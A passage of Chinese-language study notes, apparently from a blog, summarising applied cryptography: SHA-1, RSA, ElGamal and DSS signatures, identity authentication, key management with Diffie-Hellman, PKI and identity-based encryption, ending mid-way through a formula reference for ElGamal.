<h5 id="SHA-1算法"><a href="#SHA-1算法" class="headerlink" title="SHA-1算法"></a>SHA-1算法</h5><p><strong>SHA-1算法描述</strong></p>
<ul>
<li>安全哈希算法(Secure Hash Algorithm, SHA)由美国NIST设计，1993年作为联邦信息处理标准公布，1995年发布修订版FIPS PUB 180-1，通常称为SHA-1。</li>
</ul>
<p><strong>处理过程</strong></p>
<ol>
<li><strong>填充消息</strong>：与MD5的步骤①完全相同。</li>
<li><strong>附加消息长度</strong>：用64比特表示填充前消息的长度，并将其附在后面。</li>
<li><strong>初始化缓冲区</strong>：使用160比特长的缓冲区，包含5个32比特长的寄存器(A, B, C, D, E)。</li>
<li><strong>以分组为单位处理消息</strong>：每一分组都经一压缩函数处理。压缩函数由4轮处理过程构成，每轮20步迭代。</li>
<li><strong>输出</strong>：所有分组处理完后，最后一个分组的输出即为160比特的消息摘要。</li>
</ol>
<p><strong>SHA-1与MD5的比较</strong></p>
<ul>
<li>SHA-1算法基于MD4，结构与MD4类似，但安全性更高，输出长度为160比特，而MD5为128比特。SHA-1在实际应用中比MD5更为广泛。</li>
</ul>
<h4 id="第6章：数字签名"><a href="#第6章：数字签名" class="headerlink" title="第6章：数字签名"></a>第6章：数字签名</h4><h5 id="数字签名的基本概念"><a href="#数字签名的基本概念" class="headerlink" title="数字签名的基本概念"></a>数字签名的基本概念</h5><p><strong>背景</strong></p>
<ul>
<li>在政治、军事、外交、商业以及日常事务中，签名用于认证、核准、生效。在电子世界里，需要数字签名来替代手写签名，实现对数字信息的签名。</li>
</ul>
<p><strong>特性</strong></p>
<ol>
<li><strong>不可伪造性</strong>：只有签名者能生成合法签名。</li>
<li><strong>认证性</strong>：接收者可以确认签名来自签名者。</li>
<li><strong>不可重复使用性</strong>：一个消息的签名不能用于其他消息。</li>
<li><strong>不可修改性</strong>：签名后的消息不能被修改。</li>
<li><strong>不可否认性</strong>：签名者不能否认自己的签名。</li>
</ol>
<p><strong>数字签名方案组成</strong></p>
<ul>
<li>包含签名算法和验证算法。</li>
<li>签名算法输入签名者的私钥和消息，输出消息的数字签名。</li>
<li>验证算法输入签名者的公钥、消息和签名，输出真或伪。</li>
</ul>
<p><strong>数字签名方案分类</strong></p>
<ol>
<li><strong>按用途</strong>：普通数字签名、盲签名、不可否认签名、群签名、代理签名等。</li>
<li><strong>按消息恢复功能</strong>：具有消息恢复功能和不具有消息恢复功能。</li>
<li><strong>按随机数使用</strong>：确定性数字签名和随机化数字签名。</li>
</ol>
<h5 id="RSA数字签名"><a href="#RSA数字签名" class="headerlink" title="RSA数字签名"></a>RSA数字签名</h5><p><strong>RSA算法描述</strong></p>
<ol>
<li><p><strong>密钥生成</strong></p>
<ul>
<li>选择两个大素数 $ p $ 和 $ q $。</li>
<li>计算 $ n = pq $ 和欧拉函数 $ \phi(n) = (p-1)(q-1) $。</li>
<li>选择整数 $ e $，满足 $ 1 &lt; e &lt; \phi(n) $ 且 $ \gcd(e, \phi(n)) = 1 $。</li>
<li>计算 $ d $，使得 $ ed \equiv 1 \mod \phi(n) $。</li>
<li>公钥为 $ (e, n) $，私钥为 $ d $。</li>
</ul>
</li>
<li><p><strong>签名</strong></p>
<ul>
<li>对于消息 $ m $，签名为 $ s \equiv m^d \mod n $。</li>
</ul>
</li>
<li><p><strong>验证</strong></p>
<ul>
<li>对于消息签名对 $ (m, s) $，如果 $ m \equiv s^e \mod n $，则 $ s $ 是 $ m $ 的有效签名。</li>
</ul>
</li>
</ol>
<p><strong>RSA数字签名的缺陷</strong></p>
<ul>
<li>伪造签名：任何人可以伪造随机消息 $ m $ 的签名 $ s $，方法是先选取 $ s $，再用公钥 $ (e, n) $ 计算 $ m \equiv s^e \mod n $。</li>
<li>签名同态性：若已知 $ m_1 $ 和 $ m_2 $ 的签名分别为 $ s_1 $ 和 $ s_2 $，则 $ m_1m_2 $ 的签名为 $ s_1s_2 $。</li>
<li>签名消息长度限制：每次只能对 $ \log_2 n $ 位长的消息进行签名。</li>
</ul>
<p><strong>引入Hash以解决上述缺陷</strong></p>
<ul>
<li>签名前先对消息进行Hash变换，对变换后的消息签名。签名为 $ s \equiv h(m)^d \mod n $。验证时，先计算 $ h(m) $，再检查 $ h(m) \equiv s^e \mod n $ 是否成立。</li>
</ul>
<h5 id="其他数字签名方案"><a href="#其他数字签名方案" class="headerlink" title="其他数字签名方案"></a>其他数字签名方案</h5><p><strong>ElGamal签名方案</strong></p>
<ol>
<li><p><strong>参数与密钥生成</strong></p>
<ul>
<li>选择大素数 $ p $ 和本原元 $ g $。</li>
<li>随机选择整数 $ x $，计算 $ y \equiv g^x \mod p $。</li>
<li>公钥为 $ y $，私钥为 $ x $。</li>
</ul>
</li>
<li><p><strong>签名</strong></p>
<ul>
<li>对于消息 $ m $，随机选择整数 $ k $，计算 $ r \equiv g^k \mod p $， $ s \equiv (h(m) - xr)k^{-1} \mod (p-1) $。</li>
<li>签名为 $ (r, s) $。</li>
</ul>
</li>
<li><p><strong>验证</strong></p>
<ul>
<li>对于签名对 $ (m, (r, s)) $，验证 $ y^r r^s \equiv g^{h(m)} \mod p $ 是否成立。</li>
</ul>
</li>
</ol>
<p><strong>Schnorr签名方案</strong></p>
<ul>
<li>基于离散对数问题，生成签名时选择随机数使得签名不可预测。</li>
</ul>
<p><strong>Neburg–Rueppel签名方案</strong></p>
<ul>
<li>类似于ElGamal签名，基于离散对数问题的随机化数字签名方案。</li>
</ul>
<p><strong>基于身份的签名方案</strong></p>
<ul>
<li><strong>Shamir签名方案</strong>：基于身份的签名，利用身份信息生成签名。</li>
<li><strong>Cha-Cheon签名方案</strong>：改进的基于身份的签名方案，增强了安全性。</li>
</ul>
<p><strong>特殊用途的签名方案</strong></p>
<ul>
<li><strong>代理签名</strong>：允许原始签名者委托代理签名者代签。</li>
<li><strong>多重签名</strong>：多个签名者对同一消息共同签名。</li>
<li><strong>盲签名</strong>：签名者对盲化后的消息签名，不知道消息内容。</li>
<li><strong>环签名</strong>：一组签名者中的任何一个可以代表群体签名，无法识别具体签名者。</li>
</ul>
<h5 id="数字签名标准（DSS）"><a href="#数字签名标准（DSS）" class="headerlink" title="数字签名标准（DSS）"></a>数字签名标准（DSS）</h5><p><strong>DSS算法</strong></p>
<ul>
<li>1991年NIST提出，基于ElGamal和Schnorr签名方案，安全性基于离散对数问题。</li>
<li>只可用于签名，不可用于加密。</li>
</ul>
<p><strong>参数与密钥生成</strong></p>
<ul>
<li>选择素数 $ p $ 和 $ q $，其中 $ q $ 是 $ p-1 $ 的因子。</li>
<li>选择生成元 $ g $，随机选取私钥 $ x $，计算公钥 $ y \equiv g^x \mod p $。</li>
</ul>
<p><strong>签名</strong></p>
<ul>
<li>对消息 $ m $，随机选择整数 $ k $，计算 $ r \equiv (g^k \mod p) \mod q $， $ s \equiv k^{-1}(h(m) + xr) \mod q $。</li>
<li>签名为 $ (r, s) $。</li>
</ul>
<p><strong>验证</strong></p>
<ul>
<li>计算 $ w = s^{-1} \mod q $， $ u_1 = h(m)w \mod q $， $ u_2 = rw \mod q $， $ v = (g^{u_1} y^{u_2} \mod p) \mod q $。</li>
<li>验证 $ v = r $ 是否成立。</li>
</ul>
<h4 id="第7章：身份认证与访问控制"><a href="#第7章：身份认证与访问控制" class="headerlink" title="第7章：身份认证与访问控制"></a>第7章：身份认证与访问控制</h4><h5 id="基于生物特征识别的身份认证"><a href="#基于生物特征识别的身份认证" class="headerlink" title="基于生物特征识别的身份认证"></a>基于生物特征识别的身份认证</h5><p><strong>基于生物特征的身份认证</strong></p>
<ul>
<li>通过人体固有的生理或行为特征进行身份验证，分为身体特征和行为特征。</li>
</ul>
<p><strong>常用的生物特征识别技术</strong></p>
<ol>
<li><p><strong>指纹识别</strong></p>
<ul>
<li><strong>优点</strong>：<ul>
<li>指纹是人体独一无二的特征。</li>
<li>识别速度快，使用方便。</li>
<li>手指与指纹采集头相互接触，更成熟。</li>
<li>采集头体积小，价格低廉。</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li>成像质量与识别技术的限制。</li>
<li>指纹库规模的限制。</li>
<li>指纹采集在采集头上留下印痕，使得复制成为可能。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>掌纹识别</strong></p>
<ul>
<li><strong>优点</strong>：<ul>
<li>特征丰富、旋转不变性和唯一性。</li>
<li>终身不变，不易仿造。</li>
<li>采集设备成本较低，图像质量稳定。</li>
<li>不涉及隐私，易于推广。</li>
<li>容易与其他特征结合，实现一体化识别。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>人脸识别</strong></p>
<ul>
<li><strong>应用系统</strong>：嵌入式系统、服务器、个人电脑。</li>
<li><strong>研究内容</strong>：脸检测、脸表征、脸鉴别、表情/姿态分析、生理分类。</li>
</ul>
</li>
<li><p><strong>声音识别</strong></p>
<ul>
<li><strong>优点</strong>：<ul>
<li>语音获取方便，接受度高。</li>
<li>获取语音的成本低廉。</li>
<li>适合远程身份确认。</li>
<li>算法复杂度低。</li>
<li>不涉及隐私问题。</li>
</ul>
</li>
<li><strong>声纹识别</strong>：说话人辨认、说话人确认、说话人探测/跟踪。</li>
</ul>
</li>
<li><p><strong>虹膜识别</strong></p>
<ul>
<li><strong>特点与依据</strong>：<ul>
<li>虹膜的纤维组织细节复杂而丰富，具有极大的随机性。</li>
<li>具有因人而异的固有特性。</li>
<li>虹膜组织特征在出生半年至一年半内发育完全，终生不变。</li>
<li>几乎不可能通过手术改变特性，更不可能改变成与特定对象相同。</li>
<li>一般疾病不会对虹膜组织造成损伤。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>视网膜识别</strong></p>
<ul>
<li><strong>优点</strong>：极其固定的生物特征，不需要与设备接触，不会被伪造。</li>
<li><strong>缺点</strong>：健康方面的损害，对消费者没有吸引力，很难降低其成本。</li>
</ul>
</li>
<li><p><strong>DNA识别</strong></p>
<ul>
<li><strong>优点</strong>：遗传信息储存在DNA分子中，两人DNA图谱完全相同的概率极低。</li>
</ul>
</li>
</ol>
<p><strong>生物特征识别的特点</strong></p>
<ul>
<li><strong>广泛性</strong>：每个人都应该具有这种特征。</li>
<li><strong>唯一性</strong>：每个人的具体特征各不相同。</li>
<li><strong>稳定性</strong>：该特征应当不随时间地点发生变化。</li>
<li><strong>可采集性</strong>：该特征应该便于测量。</li>
</ul>
<h5 id="身份认证协议"><a href="#身份认证协议" class="headerlink" title="身份认证协议"></a>身份认证协议</h5><p><strong>身份认证协议概念</strong></p>
<ul>
<li>通过身份认证协议，验证者相信通信的另一方确实是所声称的那个实体，防止假冒。身份认证协议包含证明者（$P$）和验证者（$V$）。</li>
</ul>
<p><strong>身份认证协议满足的条件</strong></p>
<ul>
<li>$P$能向$V$证明他的确是$P$。</li>
<li>$P$向$V$证明其身份后，$V$没有获得任何有用的信息，即$V$不能冒充成$P$向第三方证明他是$P$。</li>
<li>除了$P$以外的第三者$C$以$P$的身份执行该协议，能让$V$相信他是$P$的概率可以忽略不计。</li>
</ul>
<p><strong>身份认证协议实例</strong></p>
<ul>
<li><strong>Guillou-Quisquater身份认证协议</strong>：<ol>
<li><strong>系统初始化</strong>：信任权威（$TA$）选择两个大素数p和q，计算$n=pq$，确定签名算法SigTA和Hash函数$h$。选取长度为40比特的素数$b$作为公钥，计算私钥$a=b^{-1} \mod φ(n)$。公开参数为$n, b, h$。</li>
<li><strong>$TA$向$P$颁发身份证书</strong>：P秘密选取整数u，计算$v≡(u^{-1})^b \mod n$，发送$v$给$TA$。$TA$计算签名$s=SigTA(IDP, v)$，发送证书$C(P)=(IDP, v, s)$给$P$。</li>
<li><strong>P向V证明其身份</strong>：P随机选取整数k，计算$γ≡k^b \mod n$，发送证书$C(P)$和$γ$给$V$。$V$验证$s$是否是$TA$对$(IDP, v)$的签名，如果是，V随机选取整数$r$并发送给$P$。$P$计算$y≡ku^r \mod n$，发送$y$给$V$。$V$验证是否有$γ≡v^ry^b \mod n$成立。</li>
</ol>
</li>
</ul>
<h5 id="与消息认证区分（完整性）"><a href="#与消息认证区分（完整性）" class="headerlink" title="与消息认证区分（完整性）"></a>与消息认证区分（完整性）</h5><p><strong>消息认证</strong></p>
<ul>
<li><strong>需求</strong>：防止伪造消息、篡改消息内容、消息重放或者延迟。</li>
<li><strong>定义描述</strong>：对收到的消息进行验证，证明确实是来自声称的发送方，并且没有被修改过。通过在消息中加入时间及顺序信息，完成对时间和顺序的认证。</li>
</ul>
<p><strong>常见方法</strong></p>
<ol>
<li><strong>消息加密</strong>：用整个消息的密文作为认证标识。</li>
<li><strong>消息认证码（MAC）</strong>：一个公开函数，加上一个密钥产生一个固定长度的值作为认证标识。</li>
<li><strong>哈希函数</strong>：一个公开函数将任意长度的消息映射到一个固定长度的散列值，作为认证标识。</li>
</ol>
<p><strong>消息认证与身份认证的差别</strong></p>
<ul>
<li>身份认证（实体鉴别）一般都是实时的，消息鉴别一般不提供实时性。</li>
<li>实体鉴别只证实实体的身份，消息鉴别除了要证实消息的合法性和完整性外，还需要知道消息的含义。</li>
</ul>
<h4 id="第8章：密钥管理"><a href="#第8章：密钥管理" class="headerlink" title="第8章：密钥管理"></a>第8章：密钥管理</h4><h5 id="密钥管理概述"><a href="#密钥管理概述" class="headerlink" title="密钥管理概述"></a>密钥管理概述</h5><p><strong>密钥管理</strong></p>
<ul>
<li>密钥管理是对密钥生命周期（产生、存储、分配、备份/恢复、更新、撤销、归档、销毁）全过程实施的安全保密管理。</li>
<li>主要内容包括密钥的产生、分配和维护。维护涉及密钥的存储、更新、备份、恢复、销毁等方面。</li>
</ul>
<p><strong>密钥分类</strong></p>
<ol>
<li><strong>静态密钥（长期密钥）</strong>：使用周期较长，具体周期视应用而定，可能是几小时到几年。</li>
<li><strong>会话密钥（短期密钥）</strong>：生命周期较短，可能是几分钟到几天。会话密钥通常用于在某一时间段内加密数据。</li>
</ol>
<p><strong>密钥种类</strong></p>
<ol>
<li><strong>基本密钥（base key）</strong>：又称初始密钥或用户密钥，用于参与或控制密码变换，在一定范围配置、一定时间更换。</li>
<li><strong>会话密钥（session key）</strong>：在一次通话或交换数据时使用的密钥。通常与基本密钥结合对消息进行加密，且一报一换。</li>
<li><strong>密钥加密密钥（key encrypting key）</strong>：用于对会话密钥进行加密保护。又称辅助（二级）密钥或密钥传送密钥。</li>
<li><strong>主密钥（Primary Master Key）</strong>：用于对密钥加密密钥进行加密保护。</li>
<li><strong>公钥体制下的密钥</strong>：包括公开密钥、秘密密钥、签名密钥、认证密钥等。</li>
</ol>
<p><strong>密钥产生</strong></p>
<ul>
<li><strong>基本要求</strong>：具有良好的随机性，包括长周期性、非线性、统计意义上的等概率性及不可预测性。</li>
<li><strong>主密钥</strong>：应当是高质量的真随机序列，通常通过如掷硬币、随机选取等方法产生。</li>
<li><strong>密钥加密密钥</strong>：利用真随机数产生器芯片产生或使用主密钥和强密码算法产生。</li>
<li><strong>会话密钥</strong>：在密钥加密密钥作用下通过加密算法动态地产生，如用密钥加密密钥控制AES算法产生。</li>
</ul>
<p><strong>密钥管理的层次结构</strong></p>
<ul>
<li>包括主密钥、密钥加密密钥和会话密钥的注入、密钥协定和加密。</li>
</ul>
<p><strong>密钥管理的生命周期</strong></p>
<ul>
<li>包括密钥生成、注册、装入、备份、恢复、更新、注销与销毁等过程。</li>
</ul>
<h5 id="密钥协商"><a href="#密钥协商" class="headerlink" title="密钥协商"></a>密钥协商</h5><p><strong>密钥协商协议</strong></p>
<ul>
<li>密钥协商协议使两个用户在公开信道生成一个会话密钥，该会话密钥是双方输入消息的一个函数。</li>
</ul>
<p><strong>Diffie-Hellman密钥交换协议</strong></p>
<ul>
<li>1976年由Diffie和Hellman提出，是一个典型的密钥协商协议。通信双方利用该协议可以安全地建立一个共享密钥。</li>
<li><strong>公开参数</strong>：设p是一个大素数，g∈Zp是一个本原元。</li>
<li><p><strong>协议过程</strong>：</p>
<ol>
<li>$A$随机选取$a(2≤a≤p-2)$，计算$yA ≡ ga \mod p$，并将$yA$发送给$B$。</li>
<li>$B$随机选取$b(2≤b≤p-2)$，计算$yB ≡ gb \mod p$，并将$yB$发送给$A$。</li>
<li>$A$计算$k ≡ yB^a \mod p$。</li>
<li>$B$计算$k ≡ yA^b \mod p$。</li>
<li>用户$A$和$B$建立共享密钥$k ≡ gab \mod p$，然后使用对称密码体制以k为密钥进行保密通信。</li>
</ol>
</li>
<li><p><strong>例子</strong>：假设$p=19$, $g=13$, A和B分别选取随机数$a=3$和$b=5$。A计算$yA≡133 \mod 19≡12$，B计算$yB≡135 \mod 19≡14$。A和B分别计算$k≡143 \mod 19≡8$和$k≡125 \mod 19≡8$，获得共享密钥$k=8$。</p>
</li>
<li><p><strong>中间人攻击</strong>：敌手在A和B之间截获并替换消息，导致A与敌手建立共享密钥$K_1$，B与敌手建立共享密钥$K_2$，缺乏认证性。</p>
</li>
</ul>
<p><strong>端到端协议</strong></p>
<ul>
<li>1992年，Diffie, Oorschot和Wiener提出了端到端协议（station-to-station protocol），改进了Diffie-Hellman协议，增加了实体间的相互认证和密钥确认，可抵抗中间人攻击。</li>
<li><strong>公开参数</strong>：$p$是大素数，$g$是本原元。每个用户有签名方案和可信中心（TA）签发的证书。</li>
<li><strong>协议过程</strong>：<ol>
<li>A随机选取$a$，计算yA并发送给B。</li>
<li>B随机选取$b$，计算yB和会话密钥k，并计算EB。</li>
<li>B发送证书、yB和EB给A。</li>
<li>A验证证书有效性，计算k，解密EB并验证签名。</li>
<li>A计算EA并发送证书和EA给B。</li>
<li>B验证证书有效性，解密EA并验证签名。</li>
</ol>
</li>
</ul>
<h5 id="密钥分配与密钥分割"><a href="#密钥分配与密钥分割" class="headerlink" title="密钥分配与密钥分割"></a>密钥分配与密钥分割</h5><p><strong>密钥分配的方法</strong></p>
<ol>
<li><strong>物理分配</strong>：通过信使进行分配，系统安全性依赖于信使。</li>
<li><strong>对称密码技术分配</strong>：通过信任权威帮助用户产生共享密钥，需要初始密钥的物理建立。</li>
<li><strong>公钥密码技术分配</strong>：使用公钥密码技术，互不认识或信任的用户可建立共享密钥，使用密钥交换协议实现。</li>
</ol>
<p><strong>秘密共享</strong></p>
<ul>
<li>秘密共享是现代密码学的一项重要技术，将一个秘密分成许多份额，分配给一群用户，使得足够多的用户提供份额才能重建原来的秘密。</li>
</ul>
<p><strong>$(k, n)$门限方案</strong></p>
<ul>
<li>将秘密s分成n个秘密份额，使得：<ol>
<li>由k个或多于k个用户持有的份额可恢复秘密s。</li>
<li>由k-1个或更少用户持有的份额不能获得关于秘密s的任何信息。</li>
</ol>
</li>
<li>k称为门限值，满足$1≤k≤n$。</li>
</ul>
<h4 id="第9章：PKI技术"><a href="#第9章：PKI技术" class="headerlink" title="第9章：PKI技术"></a>第9章：PKI技术</h4><h5 id="PKI概念"><a href="#PKI概念" class="headerlink" title="PKI概念"></a>PKI概念</h5><p><strong>PKI技术概述</strong></p>
<ul>
<li>公钥基础设施（Public Key Infrastructure, PKI）是用于实施和提供安全服务的基础设施。它能提供认证、数据完整性、数据保密性、不可否认性、公证等服务。</li>
<li>PKI主要用于抵抗“公钥替换”攻击，通过将用户的公钥与其身份信息以可验证和可信的方式关联起来，确保公钥的真实性。</li>
</ul>
<p><strong>PKI服务</strong></p>
<ol>
<li><strong>认证服务</strong>：确认实体的真实身份，通过验证证书和数字签名，确保通信双方的身份。</li>
<li><strong>数据完整性服务</strong>：保证数据在传输和处理过程中未被修改。通过数字签名和哈希算法提供数据完整性保证。</li>
<li><strong>数据保密性服务</strong>：采用“数字信封”机制，使用对称密钥加密敏感数据，并用接收方的公钥加密对称密钥。</li>
<li><strong>不可否认性服务</strong>：保证实体对其行为的认可，包括数据来源、接收、传输、创建和同意的不可否认性。</li>
<li><strong>公证服务</strong>：确认数据的有效性和正确性，通过数字签名和公钥验证。</li>
</ol>
<h5 id="PKI组成结构"><a href="#PKI组成结构" class="headerlink" title="PKI组成结构"></a>PKI组成结构</h5><p><strong>PKI组成</strong></p>
<ol>
<li><strong>注册中心（Registration Authority, RA）</strong>：负责用户的身份注册和验证。</li>
<li><strong>证书中心（Certificate Authority, CA）</strong>：负责生成和颁发数字证书。</li>
<li><strong>目录库（Directory）</strong>：存储和管理数字证书，提供查询服务。</li>
<li><strong>证书回收列表（Certificate Revocation List, CRL）</strong>：管理和发布被撤销的证书列表。</li>
</ol>
<h5 id="PKI流程"><a href="#PKI流程" class="headerlink" title="PKI流程"></a><strong>PKI流程</strong></h5><ul>
<li>用户生成自己的公钥和私钥后，将公钥发送给RA进行注册申请。</li>
<li>RA批准申请后，CA颁发包含用户身份信息、公钥和CA签名的数字证书。</li>
<li>当其他用户发送消息时，需要从目录库中找到接收方的数字证书并验证其有效性，然后利用公钥加密消息。</li>
</ul>
<h5 id="PKI的关键技术"><a href="#PKI的关键技术" class="headerlink" title="PKI的关键技术"></a>PKI的关键技术</h5><p><strong>数字证书</strong></p>
<ul>
<li>数字证书是由CA签发的，用于证明公钥的持有者身份的信息。它包括用户的身份信息、公钥和CA的签名。</li>
<li>数字证书通过数字签名保证其真实性和完整性，防止伪造。</li>
</ul>
<p><strong>数字认证中心（CA）</strong></p>
<ul>
<li>CA是PKI的核心，负责签发、管理、撤销和更新数字证书。</li>
<li>CA的公钥通过可信任的渠道分发给用户，用于验证数字证书。</li>
</ul>
<p><strong>证书的验证</strong></p>
<ul>
<li>验证数字证书的过程包括检查证书的签名是否由可信任的CA生成，以及证书是否在有效期内。</li>
<li>用户通过验证证书的CA签名，确保证书的真实性，然后使用证书中的公钥进行加密通信或验证签名。</li>
</ul>
<p><strong>证书的发放</strong></p>
<ul>
<li>用户向RA提交申请并经过验证后，CA生成和签发数字证书。</li>
<li>证书包含用户的公钥、身份信息和CA的签名，确保证书的合法性和公钥的真实性。</li>
</ul>
<p><strong>证书撤销机制</strong></p>
<ul>
<li>当证书持有者的私钥泄露或不再可信时，需要撤销证书。</li>
<li>CA通过发布证书回收列表（CRL）来管理被撤销的证书，用户在使用证书前需要查询CRL以确认证书的状态。</li>
</ul>
<p><strong>PKI结构中的信任关系</strong></p>
<ul>
<li><strong>信任</strong>：CA、RA、目录库等组件之间的信任关系确保整个PKI系统的安全性。</li>
<li><strong>不信任</strong>：被撤销的证书、未经验证的公钥或不可信的CA都不应被信任。</li>
</ul>
<h5 id="PKI替代方案：基于身份的加密体制（IBE）"><a href="#PKI替代方案：基于身份的加密体制（IBE）" class="headerlink" title="PKI替代方案：基于身份的加密体制（IBE）"></a>PKI替代方案：基于身份的加密体制（IBE）</h5><p><strong>概念</strong></p>
<ul>
<li>基于身份的加密体制（Identity-Based Encryption, IBE）由Shamir于1984年提出，旨在简化证书管理。</li>
<li>IBE使用与实体身份相关的信息（如电子邮箱、手机号码）作为公钥，避免了频繁获取和验证证书的需求。</li>
</ul>
<p><strong>IBE工作原理</strong></p>
<ol>
<li><strong>系统初始化</strong>：私钥生成器（PKG）产生主密钥和公开参数，并公开发布。</li>
<li><strong>私钥生成</strong>：PKG根据主密钥和用户的身份信息生成用户的私钥。</li>
<li><strong>加密消息</strong>：使用实体的身份信息和公开参数计算公钥并加密消息。</li>
<li><strong>解密消息</strong>：实体通过私钥解密消息。</li>
</ol>
<p><strong>IBE的有效期管理</strong></p>
<ul>
<li>在公钥生成中加入时间信息，使公钥变为“身份信息+时间信息+PKG的公开参数”的组合，从而实现密钥的更新和有效期管理。</li>
</ul>
<p><strong>IBE与PKI的比较</strong></p>
<ul>
<li><strong>公私钥管理</strong>：IBE中的公钥由身份信息和公开参数生成，私钥由PKG生成；PKI中的公私钥对由用户或KMC生成，公钥通过数字证书发布。</li>
<li><strong>密钥有效期</strong>：IBE通过加入时间信息实现密钥更新和撤销，PKI通过证书有效期和CRL管理密钥。</li>
<li><strong>信道安全性</strong>：IBE需要可靠的安全信道传递私钥，PKI对信道安全性的要求较低，私钥由用户掌握。</li>
</ul>
<p>RSA算法是一种广泛使用的公钥密码算法，它既可以用于加密，也可以用于签名。尽管它们都使用相同的数学基础和密钥对，但RSA加密和RSA签名有不同的目的和操作方式。</p>
<h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><h5 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h5><p><strong>目的</strong>：保护数据的机密性，确保只有拥有相应私钥的人能够解密数据。</p>
<p><strong>过程</strong>：</p>
<ol>
<li><p><strong>加密</strong>：</p>
<ul>
<li>使用接收方的公钥 $ e $ 对消息 $ m $ 进行加密。</li>
<li>加密公式：$ c \equiv m^e \pmod{n} $</li>
<li>这里，$ c $ 是密文，$ m $ 是明文，$ n $ 是两个大素数的乘积（$ n = p \times q $），$ e $ 是公钥。</li>
</ul>
</li>
<li><p><strong>解密</strong>：</p>
<ul>
<li>使用接收方的私钥 $ d $ 对密文 $ c $ 进行解密。</li>
<li>解密公式：$ m \equiv c^d \pmod{n} $</li>
<li>这里，$ m $ 是解密后的明文，$ c $ 是密文，$ d $ 是私钥。</li>
</ul>
</li>
</ol>
<p><strong>应用</strong>：</p>
<ul>
<li>安全的消息传输，例如电子邮件加密、文件加密等。</li>
</ul>
<h5 id="RSA签名"><a href="#RSA签名" class="headerlink" title="RSA签名"></a>RSA签名</h5><p><strong>目的</strong>：验证消息的真实性和完整性，确保消息来自合法发送者且未被篡改。</p>
<p><strong>过程</strong>：</p>
<ol>
<li><p><strong>签名</strong>：</p>
<ul>
<li>使用发送方的私钥 $ d $ 对消息的哈希值 $ h(m) $ 进行签名。</li>
<li>签名公式：$ s \equiv h(m)^d \pmod{n} $</li>
<li>这里，$ s $ 是签名，$ h(m) $ 是消息 $ m $ 的哈希值，$ d $ 是私钥。</li>
</ul>
</li>
<li><p><strong>验证</strong>：</p>
<ul>
<li>使用发送方的公钥 $ e $ 对签名 $ s $ 进行验证。</li>
<li>验证公式：$ h(m) \equiv s^e \pmod{n} $</li>
<li>这里，$ h(m) $ 是从消息中计算出的哈希值，$ s $ 是签名，$ e $ 是公钥。</li>
</ul>
</li>
</ol>
<p><strong>应用</strong>：</p>
<ul>
<li>数字签名、身份认证、电子合同等需要验证数据来源和完整性的场景。</li>
</ul>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ol>
<li><p><strong>目的</strong>：</p>
<ul>
<li><strong>RSA加密</strong>：保护数据的机密性，防止未经授权的人访问数据。</li>
<li><strong>RSA签名</strong>：验证消息的真实性和完整性，确保消息的来源可靠且未被篡改。</li>
</ul>
</li>
<li><p><strong>操作过程</strong>：</p>
<ul>
<li><strong>RSA加密</strong>：<ul>
<li>加密：使用接收方的公钥 $ e $ 加密消息。</li>
<li>解密：使用接收方的私钥 $ d $ 解密消息。</li>
</ul>
</li>
<li><strong>RSA签名</strong>：<ul>
<li>签名：使用发送方的私钥 $ d $ 签名消息的哈希值。</li>
<li>验证：使用发送方的公钥 $ e $ 验证签名。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>安全性</strong>：</p>
<ul>
<li><strong>RSA加密</strong>：安全性依赖于公钥加密算法的强度和私钥的保密性。</li>
<li><strong>RSA签名</strong>：安全性依赖于数字签名算法的强度和私钥的保密性。</li>
</ul>
</li>
<li><p><strong>应用场景</strong>：</p>
<ul>
<li><strong>RSA加密</strong>：用于确保数据在传输过程中的机密性。</li>
<li><strong>RSA签名</strong>：用于确保数据的来源可信且未被篡改。</li>
</ul>
</li>
</ol>
<img src="/2024/07/20/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86_00.png" class="" title="应用密码学知识点梳理_00">
<h3 id="加密和签名算法整理"><a href="#加密和签名算法整理" class="headerlink" title="加密和签名算法整理"></a>加密和签名算法整理</h3><h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><h5 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h5><p><strong>加密</strong>：</p>
<ul>
<li>明文 $ M $</li>
<li>公钥 $ (e, n) $</li>
<li>密文 $ C $<br>$ C \equiv M^e \mod n $</li>
</ul>
<p><strong>解密</strong>：</p>
<ul>
<li>密文 $ C $</li>
<li>私钥 $ (d, n) $</li>
<li>明文 $ M $<br>$ M \equiv C^d \mod n $</li>
</ul>
<p><strong>签名</strong>：</p>
<ul>
<li>消息 $ M $</li>
<li>私钥 $ (d, n) $</li>
<li>签名 $ S $<br>$ S \equiv M^d \mod n $</li>
</ul>
<p><strong>验签</strong>：</p>
<ul>
<li>签名 $ S $</li>
<li>公钥 $ (e, n) $</li>
<li>消息 $ M $<br>$ M \equiv S^e \mod n $</li>
</ul>
<h5 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h5><p><strong>加密</strong>：</p>
<ul>
<li>明文 $ M $</li>
<li>公钥 $ (p, g, y) $<ul>
<li>素数 $ p $</li>
<li>生成元 $ g $</li>
<li>公钥 $ y = g^x \mod p $，其中 $ x $ 是私钥</li>
</ul>
</li>
<li>随机数 $ k $</li>
<li>密文 $ (C_1, C_2) $<br>$ C_1 \equiv g^k \mod p $<br>$ C_2 \equiv y^k \cdot M \mod p $</li>
</ul>
<p><strong>解密</strong>：</p>
<ul>
<li>密文 $ (C_1, C_2) $</li>
<li>私钥 $ x $</li>
<li>明文 $ M $<br>$ M \equiv C_2 \cdot (C_1)^{-x} \mod p $</li>
</ul>
<p><strong>签名</strong>：</p>
<ul>
<li>消息 $ m $</li>
<li>私钥 $ x $</li>
<li>公钥 $ y = g^x \mod p $</li>
<li>随机数 $ k $</li>
<li>签名 $ (r, s) $<br>$ r \equiv g^k \mod p $<br>$ s \equiv (H(m) - xr) \cdot k^{-1} \mod (p-1) $</li>
